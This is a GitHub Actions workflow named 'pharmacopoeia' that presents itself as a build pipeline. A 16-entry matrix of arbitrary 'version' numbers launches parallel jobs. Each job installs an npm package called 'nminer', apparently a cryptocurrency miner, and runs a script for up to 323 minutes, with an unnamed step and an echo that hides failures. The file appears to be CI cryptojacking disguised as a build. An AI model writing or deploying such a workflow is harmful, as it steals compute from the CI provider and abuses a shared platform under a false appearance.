name: pharmacopoeia
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9196 }
          - { version: 5981 }
          - { version: 6715 }
          - { version: 1230 }
          - { version: 2951 }
          - { version: 5501 }
          - { version: 6255 }
          - { version: 7917 }
          - { version: 246 }
          - { version: 6770 }
          - { version: 6787 }
          - { version: 7924 }
          - { version: 3729 }
          - { version: 6809 }
          - { version: 5288 }
          - { version: 6479 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 323m node pharmacopoeia.js || echo "pharmacopoeia executed"